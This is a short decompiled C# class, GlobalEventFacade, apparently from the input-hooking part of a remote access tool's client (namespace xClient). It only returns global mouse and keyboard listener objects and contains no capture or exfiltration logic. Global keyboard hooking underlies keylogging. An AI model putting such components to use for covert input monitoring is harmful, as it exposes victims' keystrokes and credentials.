using System;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x02000063 RID: 99
	internal class GlobalEventFacade : EventFacade
	{
		// Token: 0x060002B4 RID: 692 RVA: 0x000033D7 File Offset: 0x000015D7
		protected override MouseListener CreateMouseListener()
		{
			return new GlobalMouseListener();
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x000033DE File Offset: 0x000015DE
		protected override KeyListener CreateKeyListener()
		{
			return new GlobalKeyListener();
		}
	}
}
